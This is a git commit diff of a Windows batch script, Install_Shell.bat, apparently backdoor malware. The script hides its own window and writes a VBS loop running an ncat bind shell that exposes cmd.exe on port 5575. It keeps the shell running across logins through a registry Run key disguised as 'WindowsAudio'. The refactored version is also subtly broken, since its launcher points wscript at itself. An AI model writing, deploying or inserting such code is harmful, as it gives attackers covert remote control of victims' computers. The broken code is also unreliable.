91af69d3d038e87a9b70840f8cfa14dd293b887b
Root Maciel <65637444+rootmaciel@users.noreply.github.com>
2026-06-09 20:09:08 -0300

    Refactor Install_Shell.bat to use Downloads directory

--- Install_Shell.bat
+++ Install_Shell.bat
@@ -1,24 +1,19 @@
 @echo off
-:: Ocultar esta janela imediatamente
 if not "%1"=="hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
     exit
 )
 
-mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
-attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1
+echo Do > "%USERPROFILE%\Downloads\audio.vbs"
+echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\Downloads\audio.vbs"
+echo Loop >> "%USERPROFILE%\Downloads\audio.vbs"
 
-echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
-echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\WindowsAudio\audio.vbs"
-echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"
+echo @echo off > "%USERPROFILE%\Downloads\audio.bat"
+echo start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.bat" >> "%USERPROFILE%\Downloads\audio.bat"
+echo exit >> "%USERPROFILE%\Downloads\audio.bat"
 
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\Downloads\audio.bat" /f > nul 2>&1
 
-echo @echo off > "%USERPROFILE%\WindowsAudio\audio.bat"
-echo start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs" >> "%USERPROFILE%\WindowsAudio\audio.bat"
-echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"
-
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f > nul 2>&1
-
-start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
+start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.bat"
 
 exit
